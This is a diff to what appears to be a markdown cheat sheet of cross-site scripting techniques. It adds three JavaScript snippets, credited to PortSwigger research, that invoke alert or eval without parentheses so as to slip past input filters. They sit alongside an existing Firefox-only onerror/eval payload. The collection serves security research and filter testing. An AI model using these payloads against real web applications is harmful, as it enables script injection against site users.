@@ -80,6 +80,25 @@ Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-w
 
 ----
 
+[Garethheyes](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
+
+    [].sort.call`${alert}23`
+
+----
+
+[Garethheyes](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
+
+    [].map.call`${eval}\\u{61}lert\x2823\x29`
+
+----
+
+[Garethheyes](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
+
+    window.name='javascript:alert(23)';
+    Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`;
+
+----
+
 Only Firefox [h43z](https://twitter.com/h43z)
 
     throw onerror=eval,SyntaxError`alert\x2823\x29` 
